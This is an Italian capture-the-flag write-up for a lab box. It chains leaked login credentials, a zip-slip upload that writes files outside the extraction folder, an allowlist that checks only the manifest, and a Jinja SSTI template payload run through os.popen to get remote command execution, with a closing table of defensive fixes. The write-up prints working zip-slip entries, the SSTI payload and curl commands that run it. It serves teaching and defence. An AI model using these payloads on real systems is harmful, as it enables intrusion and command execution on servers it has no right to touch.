The Hollow Shell: zip-slip nell'upload, poi SSTI, poi shell

Un portale invita a caricare una «shell» — un pacchetto .zip di ambiance balneare per i tablet delle camere. La room ti sussurra all'orecchio di cercare degli «automation hook»: non farlo, sono un depistaggio. La vera catena è un estrattore di zip che si fida dei nomi dei file, un allowlist che guarda dalla parte sbagliata, e un dettaglio della cache dei template di Jinja che trasforma una scrittura arbitraria in esecuzione di codice.

// TL;DR
  • Credenziali lasciate in un commento HTML multilinea nella pagina di login.
  • Zip-slip: l'upload estrae le entry del .zip senza sanificare i ../ nei nomi → scrittura di file arbitraria.
  • Allowlist aggirata: il controllo guarda i file dichiarati nel manifest, non quelli realmente estratti.
  • Da write a RCE: sovrascrivo un template Jinja con un payload SSTI. Trucco fresh-worker per battere la cache dei template.

[01] Ricognizione — due porte, una sola via

Superficie d'attacco minima: SSH sulla 22 e un'app Flask servita da gunicorn sulla 5000. Con SSH fuori discussione, la 5000 è l'unica strada. La root fa un redirect a /login.

# nmap -Pn -sV -p- <target>
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu
5000/tcp  open  http     Gunicorn
# la root risponde 302 -> /login
# nmap -Pn -sV -p- <target>
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu
5000/tcp  open  http     Gunicorn
# the root returns 302 -> /login

[02] Il commento che non doveva restare

La pagina di login nasconde le credenziali in un commento HTML multilinea, di quelli che una regex frettolosa <!--.*?--> senza flag DOTALL si perde. Lezione uno di ogni CTF web: leggi sempre il sorgente.

# credenziali nel commento HTML di /login (password oscurata)
user: concierge
pass: ████
# credentials in the /login HTML comment (password redacted)
user: concierge
pass: ████

[03] Zip-slip — l'estrattore si fida dei nomi

Un .zip può contenere entry il cui nome include ../. Se il codice estrae con un banale join(dest, entry.name) senza normalizzare, quei ../ risalgono l'albero e scrivono fuori dalla cartella prevista.

# ogni shell è estratta in <base>/shells/<id>/ e servita su /shells/<id>/<file>
# carico prima una shell, annoto l'<id>, poi in un SECONDO zip:
z.writestr("shell.json", '{"name":"slip","assets":["bg.png"]}')
z.writestr("../../shells/<id-noto>/p2.json", '{}')
# dopo l'upload: GET /shells/<id-noto>/p2.json -> 200 = write-outside confermato
# each shell is extracted into <base>/shells/<id>/ and served at /shells/<id>/<file>
# first upload a shell, note the <id>, then in a SECOND zip:
z.writestr("shell.json", '{"name":"slip","assets":["bg.png"]}')
z.writestr("../../shells/<known-id>/p2.json", '{}')
# after upload: GET /shells/<known-id>/p2.json -> 200 = write-outside confirmed
// nota di metodo — il limite del canale di lettura

Il canale di lettura è limitato: /shells/<id>/<file> passa da safe_join (niente ../ nella URL) e i symlink nell'archivio finiscono come file di testo, non seguiti. Posso rileggere solo ciò che ho scritto sotto shells/ — per leggere altrove serve esecuzione.

[04] L'allowlist che guarda dalla parte sbagliata

Il portale dichiara di accettare solo png jpg gif svg css json. Ma il controllo itera sulla lista assets del manifest — ciò che l'archivio dichiara — non sui file realmente estratti. Un file non dichiarato (un template .html) finisce comunque su disco. Allowlist e zip-slip insieme danno la primitiva completa: scrivo qualunque file, ovunque.

[05] Da «scrivo un file» a «eseguo codice»

La scrittura arbitraria non è ancora esecuzione, e diversi tentativi ovvi non pagano: SSTI diretta sul campo name (renderizzato ma escaped); chiave SSH nelle ~45 home (niente write); cron in /etc/cron.d (non siamo root); symlink (scritti come testo). Il vettore giusto è l'app: sovrascrivere un template Jinja, che Flask valuta lato server.

# payload SSTI al posto di templates/login.html (e dashboard.html) via zip-slip
# NB: qui non serve conoscere alcun <id>: ../../ atterra nella base app
ZQ7X={{ 7*7 }}<pre>{{
config.__class__.__init__.__globals__['os'].popen(request.args.get('c','id')).read()
}}</pre>
# SSTI payload in place of templates/login.html (and dashboard.html) via zip-slip
# note: no <id> needed here: ../../ lands in the app base
ZQ7X={{ 7*7 }}<pre>{{
config.__class__.__init__.__globals__['os'].popen(request.args.get('c','id')).read()
}}</pre>
// l'ostacolo vero: la cache dei template

Sovrascrivere login.html non basta. Gunicorn ha più worker e nessun auto-reload; Jinja mette in cache ogni template alla prima render di quel worker. login.html è già in cache ovunque, quindi il file avvelenato viene ignorato.

// la soluzione: il trucco fresh-worker

Basta avvelenare un template che quel worker non ha ancora renderizzato. dashboard.html è servito molto meno: martellando /dashboard prima o poi rispondi da un worker che lo carica per la prima volta — avvelenato. SSTI attiva appena una richiesta cade su un worker che carica il template per la prima volta (di solito pochi colpi).

# canale RCE stabile: ?c=<comando> sul worker avvelenato, ripeti finché vedi ZQ7X
curl -s "http://<target>:5000/dashboard?c=id" -b cookie.txt
uid=996(roomservice) gid=996(roomservice)
?c=cat%20/home/roomservice/flag.txt
THM{████████████████████}
# stable RCE channel: ?c=<command> on the poisoned worker, repeat until you see ZQ7X
curl -s "http://<target>:5000/dashboard?c=id" -b cookie.txt
uid=996(roomservice) gid=996(roomservice)
?c=cat%20/home/roomservice/flag.txt
THM{████████████████████}

[06] La flag — e il depistaggio degli hook

RCE come roomservice, flag in /home/roomservice/flag.txt. Da dire chiaro: gli «automation hook» promessi dalla room non esistono nell'app in esecuzione. Ho testato ~900 nomi di chiave, cinque forme di manifest, file separati e callback di rete: nessun hook viene mai eseguito. È un depistaggio deliberato, e riconoscerlo è parte della sfida.

// flag — OSCURATA
THM{████████████████████}

La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo Enter lo batti tu.

[07] Difesa — come si chiude ogni buco

DebolezzaCorrezione
Zip-slip nell'estrazioneNormalizzare e verificare che il path risolto resti dentro la dest (os.path.realpath + controllo prefisso)
Allowlist sui file dichiaratiValidare i file realmente estratti, non il manifest; rifiutare l'intero archivio se contiene extra
Template injection via scrittura arbitrariaDirectory template non scrivibile dal processo web (owner root, 0555); Jinja SandboxedEnvironment; deploy immutabile
// verdetto

La room impacchetta tre errori classici — fiducia nei nomi dei file di un archivio, validazione sul dato sbagliato, e un motore di template che valuta input — e ci avvolge un depistaggio narrativo. Il nome dice tutto: uno «slip» in uno zip che diventa una shell. La lezione in una frase: non fidarti mai di ciò che un archivio dichiara di essere, né di dove dice di volersi estrarre.
